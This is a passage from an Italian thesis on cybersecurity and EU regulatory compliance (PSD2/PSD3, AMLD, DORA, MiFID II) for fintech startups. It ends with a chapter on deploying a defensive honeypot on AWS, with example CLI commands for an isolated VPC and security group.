La recente proposta della Commissione Europea per una nuova Direttiva sui Servizi di Pagamento (PSD3) e un Regolamento sui Servizi di Pagamento (PSR) rappresenta un'ulteriore evoluzione del framework, mirata a migliorare ulteriormente la PSD2, promuovere la concorrenza equa, migliorare la sicurezza dei pagamenti, rafforzare i diritti dei consumatori e facilitare l'accesso ai dati nell'ambito dell'\textit{open finance}. La PSD3 e il PSR mirano a superare le criticità emerse dall'attuazione della PSD2 (es. frammentazione delle API, ostacoli all'accesso per i TPP), aumentando la fiducia dei consumatori nei confronti dei pagamenti elettronici e rendendo più rapide ed efficienti le transazioni finanziarie. Basandosi sui progressi realizzati dalla PSD2, questa nuova normativa affronta questioni cruciali come il miglioramento dell'SCA, l'accesso ai sistemi di pagamento per i PSP non bancari e il potenziamento delle funzionalità dell'open banking verso l'open finance.

\subsection{Componenti Tecnici e Implementazione}
I componenti principali della PSD2 (e che verranno ulteriormente raffinati dalla PSD3/PSR) richiedono implementazioni tecniche specifiche che le startup fintech devono integrare nella loro architettura .
\begin{itemize}
    \item \textbf{Strong Customer Authentication (SCA):} Richiede l'autenticazione a più fattori per la maggior parte delle transazioni online avviate dal pagatore. L'autenticazione deve utilizzare almeno due elementi appartenenti a categorie diverse: conoscenza (qualcosa che solo l'utente conosce, es. password, PIN), possesso (qualcosa che solo l'utente possiede, es. token, smartphone su cui riceve un OTP) e inerenza (qualcosa che l'utente è, es. impronta digitale, riconoscimento facciale). Sono previste esenzioni per transazioni a basso rischio, pagamenti di basso valore, beneficiari di fiducia, ecc.
    \item \textbf{Accesso ai Conti (XS2A) e Open Banking:} Impone agli ASPSP di fornire ai TPP autorizzati l'accesso ai conti di pagamento dei clienti tramite interfacce dedicate sicure (tipicamente API), previo consenso esplicito del cliente. I TPP si dividono principalmente in:
    \begin{itemize}
        \item \textbf{Payment Initiation Service Providers (PISP):} Possono avviare ordini di pagamento per conto dell'utente dal suo conto bancario.
        \item \textbf{Account Information Service Providers (AISP):} Possono accedere alle informazioni dei conti di pagamento dell'utente per fornire servizi di aggregazione e analisi (es. personal financial management).
    \end{itemize}
\end{itemize}
L'implementazione tecnica in una startup fintech richiede lo sviluppo di interfacce sicure per l'integrazione con le API degli ASPSP (se la fintech agisce come TPP) o l'esposizione di proprie API sicure (se la fintech è un ASPSP o offre servizi assimilabili). Nell'applicazione (es. Flutter), questo richiede:
\begin{itemize}
    \item Implementazione di flussi di autenticazione SCA conformi, possibilmente delegando parte del processo all'ASPSP dell'utente.
    \item Gestione sicura dei consensi degli utenti per l'accesso ai dati e l'iniziazione dei pagamenti.
    \item Integrazione con API standardizzate (es. basate su standard come Open Banking UK, Berlin Group NextGenPSD2) o specifiche delle banche, con gestione robusta degli errori e della riconciliazione delle transazioni.
    \item Protezione delle comunicazioni tramite TLS con mutua autenticazione (mTLS) e utilizzo di certificati qualificati (eIDAS QWAC e QSealC) per l'identificazione dei TPP.
\end{itemize}
La PSD2 ha introdotto maggiore trasparenza nelle tariffe e il divieto di surcharge per i pagamenti con carta più comuni. L'architettura cloud (AWS/Azure) deve supportare la scalabilità necessaria per gestire picchi di transazioni, garantire bassa latenza e implementare un monitoraggio completo per assicurare disponibilità e performance, oltre a log di audit dettagliati per la conformità.

La transizione verso PSD3/PSR richiederà alle fintech di prepararsi per ulteriori modifiche, come una maggiore condivisione dei dati sui pagamenti per alimentare l'innovazione (verso l'open finance), un rafforzamento delle misure antifrode, e un miglioramento dell'esperienza utente nell'applicazione dell'SCA. Le startup fintech devono quindi progettare architetture flessibili e modulari.

\section{Anti-Money Laundering Directive (AMLD)}
\label{sec:amld}

\subsection{Framework Normativo per il Contrasto al Riciclaggio}
Le Direttive Antiriciclaggio (AMLD), giunte alla Quinta Direttiva (AMLD5 - Direttiva UE 2018/843) con un nuovo pacchetto legislativo (che include la Sesta Direttiva AMLD6 e un Regolamento AMLR) in fase di finalizzazione per rafforzare ulteriormente il quadro UE, stabiliscono il framework europeo per il contrasto al riciclaggio di denaro (AML - Anti-Money Laundering) e al finanziamento del terrorismo (CFT - Countering the Financing of Terrorism). Per le startup fintech, l'applicazione delle AMLD è particolarmente critica data la natura digitale dei servizi offerti e la potenziale esposizione a rischi di riciclaggio attraverso transazioni elettroniche transfrontaliere e l'uso di nuove tecnologie. La normativa richiede ai soggetti obbligati (tra cui molte fintech) l'implementazione di sistemi robusti di Adeguata Verifica della Clientela (\textit{Customer Due Diligence - CDD}), inclusa l'identificazione e verifica dell'identità del cliente e del titolare effettivo (\textit{Ultimate Beneficial Owner - UBO}), una Verifica Rafforzata (\textit{Enhanced Due Diligence - EDD}) per clienti o situazioni ad alto rischio, e procedure di monitoraggio continuo delle transazioni e di segnalazione delle operazioni sospette (\textit{Suspicious Transaction Reporting - STR}) alle Unità di Informazione Finanziaria (UIF) nazionali.

L'AMLD5 ha esteso significativamente il perimetro dei soggetti obbligati, includendo i fornitori di servizi di cambio tra valute virtuali e valute legali (fiat), i fornitori di servizi di portafoglio digitale (custodial wallet providers) e, in alcune giurisdizioni, le piattaforme di crowdfunding. Questo ampliamento è particolarmente rilevante per le startup fintech che operano nel settore dei pagamenti digitali, delle criptovalute, o del lending P2P. La direttiva richiede l'implementazione di sistemi di identificazione e verifica dell'identità dei clienti (KYC - Know Your Customer), il monitoraggio continuo delle transazioni e il mantenimento di registri dettagliati per periodi specificati.

\subsection{Implementazione Tecnica dei Controlli AML}
L'implementazione dei controlli AML in una startup fintech richiede l'integrazione di sistemi, spesso automatizzati, di monitoraggio delle transazioni e di screening dei clienti nell'architettura tecnologica esistente.
\begin{itemize}
    \item \textbf{Onboarding e KYC:} L'applicazione (es. Flutter) deve implementare processi di onboarding sicuri e conformi che includano la raccolta dei dati identificativi del cliente, la verifica dei documenti (es. tramite scansione e riconoscimento ottico, video-identificazione), l'uso di autenticazione biometrica (se appropriato e conforme al GDPR), e la verifica dell'identità in tempo reale attraverso l'integrazione con database affidabili e indipendenti o provider specializzati.
    \item \textbf{Screening:} I sistemi devono effettuare lo screening dei clienti (e dei titolari effettivi) rispetto a liste di sanzioni internazionali (es. OFAC, ONU, UE), liste di Persone Politicamente Esposte (PEP) e liste di notizie avverse (adverse media), sia in fase di onboarding che su base continuativa.
    \item \textbf{Monitoraggio delle Transazioni:} L'infrastruttura cloud (AWS/Azure) deve supportare l'implementazione di sistemi di monitoraggio delle transazioni in tempo reale o quasi reale, capaci di identificare pattern sospetti e generare alert automatici basati su regole predefinite, scenari di rischio e, sempre più, algoritmi di machine learning. Questi sistemi devono analizzare variabili come frequenza, importo, origine/destinazione geografica, controparti e tipologia di transazione per identificare potenziali attività di riciclaggio.
    \item \textbf{Gestione dei Rischi:} Implementare un approccio basato sul rischio per classificare i clienti e applicare misure di CDD o EDD appropriate.
    \item \textbf{Reporting e Record-Keeping:} I sistemi devono facilitare la generazione di report per le segnalazioni di operazioni sospette (STR) e mantenere registri completi e auditabili di tutte le attività di CDD e delle transazioni per il periodo richiesto dalla normativa (generalmente almeno 5 anni).
\end{itemize}
Il repository GitHub deve seguire pratiche di codifica sicura specifiche per i sistemi AML, garantendo l'integrità e la riservatezza dei dati sensibili dei clienti (tramite cifratura, controlli di accesso granulari) e la tracciabilità delle modifiche al software che gestisce tali controlli. L'architettura deve essere resiliente e scalabile per gestire il volume di dati e transazioni.

\section{Digital Operational Resilience Act (DORA)}
\label{sec:dora}

\subsection{Framework per la Resilienza Operativa Digitale}
Il Digital Operational Resilience Act (DORA - Regolamento UE 2022/2554) rappresenta un'importante evoluzione del framework normativo europeo per la gestione dei rischi operativi digitali nel settore finanziario. Questa normativa, applicabile a partire dal 17 gennaio 2025, stabilisce requisiti uniformi e completi per la resilienza operativa digitale di quasi tutte le entità finanziarie regolamentate nell'UE, incluse banche, imprese di investimento, gestori di fondi, compagnie di assicurazione, fornitori di servizi di cripto-asset (MiCA), e anche molte startup fintech a seconda dei servizi offerti e delle licenze possedute. DORA introduce un approccio olistico alla gestione dei rischi connessi alle Tecnologie dell'Informazione e della Comunicazione (TIC), richiedendo l'implementazione di framework completi per:
\begin{itemize}
    \item \textbf{Gestione dei rischi TIC:} Inclusa l'identificazione, protezione e prevenzione, rilevamento, risposta e ripristino.
    \item \textbf{Gestione, classificazione e segnalazione degli incidenti TIC} significativi alle autorità competenti.
    \item \textbf{Test di resilienza operativa digitale:} Inclusi test di vulnerabilità, test di penetrazione basati sulle minacce (TLPT) per le entità più critiche.
    \item \textbf{Gestione dei rischi derivanti da terze parti TIC:} Con un focus particolare sui fornitori di servizi TIC critici (CTPP), che saranno soggetti a un quadro di sorveglianza diretta a livello UE.
    \item \textbf{Condivisione di informazioni e intelligence} relative a minacce e vulnerabilità informatiche.
\end{itemize}
Per le startup fintech, DORA rappresenta una sfida significativa, ma anche un'opportunità per rafforzare la propria postura di sicurezza, data la loro dipendenza critica da infrastrutture cloud, software e servizi digitali per l'erogazione dei servizi finanziari. La normativa richiede l'implementazione di sistemi robusti di continuità operativa, piani di ripristino in caso di disastro e capacità di risposta agli incidenti. L'approccio basato sul rischio di DORA richiede una valutazione continua dell'esposizione ai rischi TIC e l'implementazione di misure di mitigazione proporzionate alla dimensione, al profilo di rischio e alla criticità delle operazioni dell'entità.

\subsection{Implementazione Operativa dei Requisiti DORA}
L'implementazione di DORA in una startup fintech richiede un approccio strutturato che integri i requisiti di resilienza operativa in tutti gli aspetti dell'architettura tecnologica e dell'organizzazione.
\begin{itemize}
    \item \textbf{Governance e Framework di Gestione dei Rischi TIC:} Il framework di governance TIC deve essere integrato nella struttura organizzativa, con responsabilità chiare definite a livello di organo di gestione. Deve essere istituito un framework di gestione dei rischi TIC che copra l'intero ciclo di vita (identificazione, valutazione, trattamento, monitoraggio e reporting).
    \item \textbf{Protezione e Prevenzione:} Implementare sistemi e controlli di sicurezza aggiornati e resilienti. L'applicazione (es. Flutter) deve essere progettata con pattern di resilienza (es. circuit breakers, retry mechanisms, graceful degradation) per mantenere le funzionalità critiche anche in caso di disruption parziali. L'architettura cloud (AWS/Azure) deve essere configurata per l'alta disponibilità (es. multi-AZ/multi-region deployment), con procedure automatizzate di backup e ripristino, load balancing e auto-scaling.
    \item \textbf{Rilevamento e Gestione degli Incidenti:} Implementare meccanismi per il rilevamento tempestivo degli incidenti TIC e procedure chiare per la loro gestione, classificazione (in base a criteri che saranno definiti dagli standard tecnici RTS/ITS) e segnalazione alle autorità.
    \item \textbf{Test di Resilienza Operativa Digitale:} Stabilire un programma di test completo e basato sul rischio, che includa valutazioni delle vulnerabilità, test di sicurezza delle applicazioni, test di penetrazione e, per le entità più significative, test di penetrazione avanzati (TLPT). I repository GitHub devono supportare procedure di test automatizzate e mantenere una documentazione completa dei risultati dei test e delle azioni di remediation.
    \item \textbf{Gestione dei Rischi da Terze Parti TIC:} Mappare le dipendenze da fornitori di servizi TIC, valutare i rischi associati (inclusi i rischi di concentrazione), definire strategie di uscita e includere clausole contrattuali specifiche che garantiscano i diritti di accesso, ispezione e audit. Particolare attenzione va posta ai fornitori cloud come AWS/Azure, che rientrano pienamente in questa categoria.
    \item \textbf{Continuità Operativa e Ripristino:} Sviluppare e testare piani di continuità operativa e di ripristino in caso di disastro per garantire il ripristino delle funzioni critiche entro obiettivi di tempo (RTO/RPO) definiti.
\end{itemize}
La documentazione è un elemento chiave di DORA, richiedendo di mantenere un inventario aggiornato dei sistemi TIC, delle dipendenze e dei processi supportati.

\section{Implementazione di Portafoglio Digitale e Servizi di Investimento}
\label{sec:digital_wallet_investment}

\subsection{Architettura per Portafoglio Digitale P2P}
L'implementazione di un portafoglio digitale (digital wallet) con funzionalità di pagamento Peer-to-Peer (P2P) e pagamenti in negozio (tramite NFC, QR code) richiede un'architettura tecnologica complessa che integri tutti i requisiti normativi discussi precedentemente (PSD2/3 per i pagamenti, AMLD per il KYC/AML, GDPR per la privacy, DORA per la resilienza, NIS2 e ISO 27001 per la sicurezza generale).

L'applicazione client (es. sviluppata in Flutter) deve:
\begin{itemize}
    \item Implementare processi di onboarding sicuri e conformi AMLD (KYC).
    \item Gestire in modo sicuro le credenziali di pagamento (es. tokenizzazione delle carte secondo PCI DSS, se applicabile).
    \item Supportare l'Autenticazione Forte del Cliente (SCA) per l'accesso al portafoglio e l'autorizzazione delle transazioni, come richiesto da PSD2/3.
    \item Integrare funzionalità di pagamento come scansione/generazione di QR code per trasferimenti P2P e pagamenti a esercenti, e interfacce NFC per pagamenti contactless.
    \item Garantire la privacy dei dati degli utenti in conformità con il GDPR.
    \item Essere sviluppata seguendo pratiche di codifica sicura e testata per vulnerabilità.
\end{itemize}
Il backend, ospitato su cloud (AWS/Azure), deve:
\begin{itemize}
    \item Gestire i profili utente, i saldi dei portafogli e lo storico delle transazioni.
    \item Processare le transazioni di pagamento in modo sicuro e resiliente, integrandosi con circuiti di pagamento o sistemi bancari (es. tramite API PSD2).
    \item Implementare sistemi di monitoraggio delle transazioni per AML e prevenzione frodi.
    \item Esporre API sicure per l'app client e, potenzialmente, per partner terzi.
    \item Garantire alta disponibilità, scalabilità e capacità di ripristino in caso di disastro (DORA).
    \item Registrare log di audit completi per tutte le operazioni.
    \item Proteggere i dati con cifratura a riposo e in transito.
\end{itemize}
La sicurezza dell'infrastruttura deve essere gestita secondo i principi di ISO 27001 e NIS2, con segmentazione di rete, controlli di accesso IAM, monitoraggio continuo e un piano di risposta agli incidenti.

\subsection{Integrazione Investment-as-a-Service}
L'implementazione di servizi di investimento, ad esempio attraverso l'integrazione di API da provider di \textit{Investment-as-a-Service} (IaaS) o operando come impresa di investimento, introduce complessità normative e tecniche aggiuntive, principalmente legate alla direttiva MiFID II / MiFIR (Markets in Financial Instruments Directive/Regulation) e alle normative nazionali di attuazione.

L'applicazione client (Flutter) e il backend devono:
\begin{itemize}
    \item Gestire l'onboarding dei clienti per i servizi di investimento, che include la raccolta di informazioni per la valutazione di adeguatezza e appropriatezza (MiFID II).
    \item Presentare in modo chiaro e trasparente le informazioni sugli strumenti finanziari, i costi, gli oneri e i rischi associati.
    \item Permettere agli utenti di visualizzare il proprio portafoglio di investimenti, le performance e lo storico delle transazioni.
    \item Implementare flussi sicuri per l'inoltro di ordini di acquisto/vendita, con adeguata autenticazione e conferma.
    \item Integrare in modo sicuro le API del provider IaaS, gestendo autenticazione (es. OAuth 2.0), autorizzazione, rate limiting e gestione degli errori.
    \item Garantire la protezione dei dati degli investitori (GDPR) e la sicurezza delle comunicazioni.
\end{itemize}
Il backend deve inoltre:
\begin{itemize}
    \item Mantenere registrazioni dettagliate di tutte le comunicazioni con i clienti e le transazioni (record-keeping MiFID II).
    \item Implementare i requisiti di best execution se la fintech è responsabile dell'esecuzione degli ordini.
    \item Gestire la reportistica normativa (es. transaction reporting a CONSOB/ESMA).
    \item Assicurare la resilienza operativa dell'infrastruttura che supporta i servizi di investimento (DORA).
\end{itemize}
L'integrazione con provider IaaS richiede una rigorosa due diligence sul fornitore (gestione dei rischi da terze parti secondo DORA e ISO 27001) e la definizione chiara delle responsabilità contrattuali.

\chapter{Conclusioni e Prospettive Future}
\label{chap:conclusioni}

L'analisi condotta in questa tesi ha evidenziato la criticità della cybersecurity e della conformità normativa per le startup fintech che intendono operare con successo e sostenibilità nel panorama finanziario moderno. L'adozione di framework di sicurezza riconosciuti come il NIST CSF e l'ISO/IEC 27001, unitamente a standard tecnici come NIST SP 800-53 e principi emergenti quali Zero Trust, fornisce una solida base per la costruzione di infrastrutture resilienti, specialmente in ambienti cloud come AWS.

Tuttavia, la sola implementazione tecnica non è sufficiente. Il complesso intreccio di normative europee e nazionali – tra cui NIS2, GDPR, PSD2/3, AMLD e il nuovo DORA – impone alle startup fintech un approccio olistico che integri la sicurezza e la conformità \textit{by design} in ogni aspetto del loro modello di business e della loro architettura tecnologica. Questo richiede non solo competenze tecniche specializzate, ma anche una profonda comprensione del quadro legale e una cultura aziendale orientata alla gestione proattiva del rischio.

Le startup che utilizzano tecnologie moderne come Flutter per lo sviluppo mobile, GitHub per la gestione del codice e piattaforme cloud come AWS/Azure, possono beneficiare della flessibilità e scalabilità di tali strumenti, ma devono essere consapevoli delle responsabilità che ne derivano in termini di configurazione sicura e monitoraggio continuo. L'implementazione di portafogli digitali e servizi di investimento, in particolare, accentua queste sfide, richiedendo un'attenzione meticolosa ai dettagli normativi specifici di tali servizi.

In prospettiva futura, è prevedibile un'ulteriore evoluzione del panorama normativo e delle minacce informatiche. Le startup fintech dovranno quindi investire costantemente in:
\begin{itemize}
    \item \textbf{Aggiornamento continuo delle competenze:} Per rimanere al passo con le nuove tecnologie, le nuove minacce e le evoluzioni normative.
    \item \textbf{Automazione della sicurezza e della compliance:} Per gestire la complessità in modo efficiente e ridurre il rischio di errore umano.
    \item \textbf{Collaborazione e condivisione di informazioni:} Sia internamente che con altre entità del settore e con le autorità, per migliorare la capacità collettiva di prevenzione e risposta.
    \item \textbf{Resilienza operativa:} Non solo per conformarsi a DORA, ma come imperativo strategico per garantire la continuità del business e la fiducia dei clienti.
\end{itemize}
In conclusione, sebbene le sfide siano significative, le startup fintech che abbracciano un approccio maturo e proattivo alla cybersecurity e alla conformità normativa non solo mitigano i rischi, ma possono anche differenziarsi sul mercato, costruendo un vantaggio competitivo basato sulla fiducia, sulla sicurezza e sulla resilienza.

\chapter{Conclusioni}
Nell'odierno panorama della cybersecurity, gli attacchi informatici diretti verso le istituzioni finanziarie stanno diventando sempre più sofisticati e frequenti. Le startup fintech, che gestiscono dati sensibili e transazioni economiche, rappresentano un bersaglio particolarmente appetibile per i cybercriminali. Questo capitolo esamina l'implementazione di un honeypot all'interno di un'infrastruttura AWS come strumento di sicurezza proattiva per una startup fintech, analizzandone definizione, utilità, vantaggi, svantaggi, costi e procedure tecniche di implementazione. L'analisi includerà inoltre un esperimento pratico di attacco per verificare l'efficacia dell'implementazione.

\section{Definizione e Utilità di un Honeypot}
\label{sec:def_utilita}

\subsection{Che cos'è un Honeypot}
\label{subsec:cos_e_honeypot}

Un honeypot in informatica è un meccanismo di sicurezza progettato per funzionare come esca, con lo scopo di attirare i cybercriminali in modo da poterne osservare metodologie, tecniche e strumenti utilizzati durante un tentativo di intrusione \cite{proofpoint2024}. Il termine "honeypot" (letteralmente "barattolo di miele") riflette efficacemente la sua funzione: attirare gli aggressori informatici come il miele attira gli insetti, per poi studiarli e sviluppare contromisure adeguate \cite{universeit2021}.

Si tratta di un sistema hardware o software che simula un ambiente vulnerabile, isolato dall'infrastruttura di produzione principale dell'organizzazione, progettato per essere percepito come un bersaglio legittimo e interessante dagli attaccanti \cite{insic2023, perego_2023}. L'honeypot appare deliberatamente vulnerabile e allettante, imitando un obiettivo reale come un server, una rete o un'applicazione contenente dati apparentemente preziosi \cite{proofpoint2024, vienažindytė_2020}.

\subsection{Utilità nel Contesto di una Startup fintech}
\label{subsec:utilita_fintech}

Nel contesto di una startup fintech, un honeypot risulta particolarmente utile per diverse ragioni strategiche:

\begin{enumerate}
    \item \textbf{Rilevamento precoce delle minacce}: Consente di identificare tentativi di intrusione nella fase iniziale, prima che raggiungano i sistemi critici contenenti dati finanziari sensibili.
    \item \textbf{Comprensione degli attaccanti}: Fornisce informazioni preziose sulle tattiche, tecniche e procedure (TTP) utilizzate dagli aggressori specificamente interessati ai servizi finanziari \cite{vito2024}.
    \item \textbf{Riduzione dei falsi positivi}: A differenza di altri sistemi di sicurezza, qualsiasi interazione con un honeypot è probabilmente malevola, riducendo l'affaticamento da allerta.
    \item \textbf{Aggiornamento delle difese}: Permette di perfezionare i sistemi di rilevamento delle intrusioni (IDS) e migliorare la risposta alle minacce basandosi su attacchi reali \cite{fortinet2023}.
    \item \textbf{Conformità normativa}: Aiuta a dimostrare un approccio proattivo alla sicurezza, supportando la conformità con normative finanziarie stringenti come PSD2, GDPR e altre regolamentazioni del settore fintech.
\end{enumerate}

\section{Tipologie di Honeypot}
\label{sec:tipologie}

La scelta della tipologia di honeypot dipende dagli obiettivi specifici dell'organizzazione e dal livello di risorse che intende investire. Per una startup fintech, è fondamentale comprendere le diverse opzioni disponibili per selezionare la soluzione più adatta \cite{perego_2023}.

\subsection{Classificazione per Livello di Interazione}
\label{subsec:class_interazione}

\subsubsection{Honeypot a Bassa Interazione}
\label{subsubsec:bassa_interazione}

Gli honeypot a bassa interazione simulano servizi di rete semplici come server web, FTP o database, limitando l'interazione con l'attaccante \cite{vito2024}. Questi sistemi:
\begin{itemize}
    \item Registrano principalmente le attività di base degli aggressori.
    \item Richiedono risorse limitate per l'implementazione e la manutenzione.
    \item Presentano un rischio minimo di compromissione.
    \item Sono efficaci contro attacchi automatizzati e scansioni di massa \cite{nordvpn}.
\end{itemize}

\subsubsection{Honeypot ad Alta Interazione}
\label{subsubsec:alta_interazione}

Gli honeypot ad alta interazione replicano sistemi complessi o interi segmenti di rete, offrendo un ambiente più realistico che può attrarre attacchi mirati e sofisticati \cite{vito2024}. Questi honeypot:
\begin{itemize}
    \item Consentono un'interazione estesa con gli aggressori.
    \item Raccolgono informazioni dettagliate sui metodi d'attacco avanzati.
    \item Richiedono maggiori risorse e competenze per implementazione e gestione.
    \item Comportano un rischio più elevato di essere utilizzati come trampolino per ulteriori attacchi.
\end{itemize}

\subsection{Classificazione per Scopo}
\label{subsec:class_scopo}

\subsubsection{Honeypot di Ricerca}
\label{subsubsec:ricerca}

Utilizzati principalmente da istituzioni governative e centri di ricerca, sono progettati per analizzare approfonditamente gli attacchi subiti al fine di perfezionare le tecniche di protezione esistenti \cite{proofpoint2024}. Questi honeypot sono generalmente complessi e richiedono un monitoraggio continuo. Un esempio di setup su AWS per ricerca è discusso in \cite{tsang_2022}.

\subsubsection{Honeypot di Produzione}
\label{subsubsec:produzione}

Impiegati comunemente in ambito aziendale, gli honeypot di produzione vengono implementati all'interno di un più ampio sistema di difesa attiva (Intrusion Detection System o IDS) \cite{proofpoint2024}. Sono concepiti per:
\begin{itemize}
    \item Identificare attacchi in corso nell'ambiente produttivo.
    \item Distrarre gli aggressori dai sistemi reali.
    \item Generare avvisi in tempo reale.
    \item Supportare le operazioni di sicurezza quotidiane.
\end{itemize}

\section{Vantaggi e Svantaggi degli Honeypot}
\label{sec:vantaggi_svantaggi}

\subsection{Vantaggi}
\label{subsec:vantaggi}

L'implementazione di un honeypot in un'infrastruttura AWS per una startup fintech offre numerosi vantaggi significativi:

\begin{enumerate}
    \item \textbf{Raccolta di intelligence sulle minacce}: Gli honeypot permettono di osservare gli aggressori in azione, raccogliendo informazioni preziose sulle loro identità, tattiche, strumenti e motivazioni \cite{proofpoint2024, fortinet2023}. Questa intelligence è particolarmente rilevante per le fintech, che sono spesso bersagli di attacchi mirati.
    \item \textbf{Identificazione di vulnerabilità}: Facilitano la scoperta delle debolezze nei sistemi informatici aziendali \cite{universeit2021}, permettendo di anticipare e correggere potenziali problemi prima che vengano sfruttati in attacchi reali.
    \item \textbf{Rilevamento precoce di nuove minacce}: Possono intercettare attacchi zero-day o tecniche emergenti prima che raggiungano i sistemi di produzione.
    \item \textbf{Deviazione degli attacchi}: Attirano gli aggressori su sistemi non critici, proteggendo i sistemi reali contenenti dati finanziari sensibili \cite{vito2024}.
    \item \textbf{Valutazione dell'efficacia delle difese}: Consentono di testare l'adeguatezza delle misure di sicurezza esistenti e identificare potenziali vulnerabilità da correggere \cite{vito2024}.
    \item \textbf{Riduzione dei falsi positivi}: A differenza di altri strumenti di sicurezza, qualsiasi attività su un honeypot è presumibilmente sospetta, riducendo il problema dei falsi allarmi \cite{nordvpn}.
    \item \textbf{Miglioramento del tempo di risposta}: Forniscono avvisi tempestivi che permettono interventi rapidi, riducendo il tempo medio di rilevamento (MTTD) e di risposta (MTTR) agli incidenti di sicurezza.
\end{enumerate}

\subsection{Svantaggi}
\label{subsec:svantaggi}

Nonostante i benefici, l'implementazione di honeypot presenta anche alcune criticità da considerare:

\begin{enumerate}
    \item \textbf{Rischio di identificazione}: Se gli attaccanti si accorgono dell'inganno, potrebbero cambiare strategia e dirigere i loro sforzi verso altri sistemi \cite{insic2023, perego_2023}, vanificando il valore dell'honeypot.
    \item \textbf{Complessità di gestione}: Richiedono competenze specifiche per l'implementazione e il monitoraggio, aumentando potenzialmente il carico di lavoro per il team IT di una startup.
    \item \textbf{Rischi di compromissione}: Se non configurati correttamente, gli honeypot potrebbero diventare un punto d'ingresso per accedere ai sistemi reali \cite{universeit2021} o essere usati per attaccare terzi.
    \item \textbf{Considerazioni legali}: In alcune giurisdizioni, l'utilizzo di honeypot potrebbe sollevare questioni legali relative alla privacy e all'intrappolamento.
    \item \textbf{Costi operativi}: Richiedono risorse per la configurazione, il mantenimento e l'analisi, che potrebbero essere significative per una startup con budget limitato \cite{reddit_ec2}.
    \item \textbf{Falso senso di sicurezza}: Affidarsi eccessivamente agli honeypot potrebbe portare a trascurare altri aspetti fondamentali della sicurezza informatica.
\end{enumerate}

\section{Implementazione di un Honeypot in AWS}
\label{sec:implementazione_aws}

Diverse soluzioni e guide esistono per implementare honeypot su AWS, da soluzioni open-source come Cowrie \cite{cowrie_aws, infosanity_2020, cowrie_devs_2024} e T-Pot \cite{zhang_2023} a soluzioni commerciali disponibili sul Marketplace \cite{aws_marketplace} o integrazioni con piattaforme SIEM/IDR \cite{rapid7, 10183431}.

\subsection{Pianificazione e Requisiti}
\label{subsec:pianificazione}

Prima di procedere con l'implementazione tecnica, è fondamentale definire chiaramente obiettivi e requisiti:

\begin{itemize}
    \item \textbf{Obiettivi di sicurezza}: Determinare se lo scopo principale è il rilevamento precoce delle minacce, la raccolta di intelligence o la distrazione degli attaccanti.
    \item \textbf{Tipo di honeypot}: Selezionare tra honeypot a bassa o alta interazione in base alle risorse disponibili e agli obiettivi.
    \item \textbf{Posizionamento}: Decidere se collocare l'honeypot all'interno o all'esterno del perimetro aziendale (es. in una DMZ).
    \item \textbf{Risorse da simulare}: Identificare quali servizi finanziari o applicazioni imitare per risultare attraenti agli aggressori (potenzialmente informato da analisi di mercato come \cite{fricano2017}).
    \item \textbf{Meccanismi di monitoraggio}: Definire come verranno registrati e analizzati i tentativi di intrusione (es. log CloudWatch \cite{cloudwatch_pricing}).
    \item \textbf{Procedure di risposta}: Stabilire protocolli di intervento in caso di rilevamento di attacchi.
\end{itemize}

\subsection{Selezione del Tipo di Honeypot per una Startup fintech}
\label{subsec:selezione_tipo}

Per una startup fintech, consigliamo un approccio equilibrato:

\begin{itemize}
    \item \textbf{Fase iniziale}: Implementare honeypot a bassa interazione che simulino API finanziarie, portali di internet banking e database con dati fittizi. Questi sono più semplici da gestire e meno rischiosi.
    \item \textbf{Fase avanzata}: Considerare honeypot ad alta interazione (come T-Pot \cite{zhang_2023} o configurazioni custom \cite{tsang_2022}) che emulino interi sistemi di pagamento o piattaforme di trading, per raccogliere intelligence più dettagliata.
\end{itemize}

\subsection{Implementazione Tecnica in AWS}
\label{subsec:implementazione_tecnica}

\subsubsection{Architettura Generale}
\label{subsubsec:architettura}

L'architettura proposta utilizza diversi servizi AWS per creare un sistema di honeypot sicuro ed efficace:

% Non uso lstlisting per questo diagramma semplice
\begin{verbatim}
VPC Isolato
|
|-- Public Subnet (DMZ)
|   |-- Honeypot Server EC2 (es. T-Pot)
|   |-- (Opzionale) Load Balancer (ALB)
|
|-- Private Subnet (per gestione/monitoraggio sicuro)
    |-- (Opzionale) Server di monitoraggio
    |-- Database per log (es. RDS, se non si usa CloudWatch/Elasticsearch)
    |-- Integrazione con AWS CloudWatch
    |-- Integrazione con AWS GuardDuty
\end{verbatim}

\subsubsection{Configurazione del VPC Isolato}
\label{subsubsec:config_vpc}

Il primo passo consiste nel creare un Virtual Private Cloud (VPC) isolato dalla rete di produzione per contenere l'honeypot e limitare i rischi.

\begin{lstlisting}[caption={Comandi AWS CLI (esemplificativi) per la creazione di un VPC isolato}, label=lst:vpc_setup]
# Creazione VPC
aws ec2 create-vpc --cidr-block 10.0.0.0/16 --tag-specifications 'ResourceType=vpc,Tags=[{Key=Name,Value=HoneypotVPC}]'

# Creazione subnet pubblica
aws ec2 create-subnet --vpc-id vpc-xxxxxxxx --cidr-block 10.0.1.0/24 --availability-zone eu-west-1a --tag-specifications 'ResourceType=subnet,Tags=[{Key=Name,Value=HoneypotPublicSubnet}]'

# Creazione subnet privata (per gestione sicura, se necessaria)
aws ec2 create-subnet --vpc-id vpc-xxxxxxxx --cidr-block 10.0.2.0/24 --availability-zone eu-west-1a --tag-specifications 'ResourceType=subnet,Tags=[{Key=Name,Value=HoneypotPrivateSubnet}]'

# Configurazione Internet Gateway e Route Table per la subnet pubblica
aws ec2 create-internet-gateway --tag-specifications 'ResourceType=internet-gateway,Tags=[{Key=Name,Value=HoneypotIGW}]'
aws ec2 attach-internet-gateway --internet-gateway-id igw-xxxxxxxx --vpc-id vpc-xxxxxxxx
# ... creare route table, aggiungere route 0.0.0.0/0 via IGW, associare a subnet pubblica ...
\end{lstlisting}

\subsubsection{Implementazione del Server Honeypot (Esempio con EC2)}
\label{subsubsec:impl_server}

Creiamo un'istanza EC2 (es. tipo t2.micro o t2.medium \cite{aws_t2}) che ospiterà il software honeypot.

\begin{lstlisting}[caption={Configurazione (esemplificativa) del server honeypot EC2}, label=lst:ec2_setup]
# Creazione Security Group (aprire solo porte necessarie per l'honeypot!)
aws ec2 create-security-group --group-name HoneypotSG --description "Security Group for Honeypot" --vpc-id vpc-xxxxxxxx
# Esempio: Apertura porte comuni per T-Pot (SSH, Telnet, Web, etc.)
# ATTENZIONE: Aprire queste porte rende l'istanza un bersaglio!
aws ec2 authorize-security-group-ingress --group-id sg-xxxxxxxx --protocol tcp --port 22 --cidr 0.0.0.0/0
aws ec2 authorize-security-group-ingress --group-id sg-xxxxxxxx --protocol tcp --port 80 --cidr 0.0.0.0/0
